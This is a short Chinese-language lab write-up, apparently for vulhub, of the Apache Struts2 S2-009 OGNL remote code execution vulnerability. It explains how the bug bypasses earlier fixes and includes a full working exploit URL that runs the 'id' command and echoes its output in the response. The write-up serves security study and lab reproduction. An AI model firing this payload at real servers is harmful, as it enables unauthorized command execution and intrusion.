# Struts2_009_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行--->有回显

### 0x01漏洞介绍

​			Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`的方法来执行它，从而绕过官方对#、\等特殊字符的防御，在修补了S2-003和S2-005之后，攻击者又发现了一种新的绕过`ParametersInterceptor`正则保护的攻击方式当传入`(ONGL)(1)`时，会将前者视为ONGL表达式来执行，从而绕过了正则的匹配保护。而且由于其在HTTP参数值中，也可以进一步绕过字符串限制的保护

##### 			影响版本

  		2.1.0 - 2.3.1.1

### 0x02漏洞复现

触发地址`/ajax/example5.action`

#### payload：

/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27**id**%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]



​			**登录界面**

![S2_009_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_009_rce_1.jpg)

​			**Burpsuite抓包，发送第一个payload，发现id被执行**

![S2_009_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_009_rce_2.jpg)

​			

### 0x03参考资料

http://luckyzmj.cn/posts/1a3db16d.html

https://blog.csdn.net/qq_45625605/article/details/103121948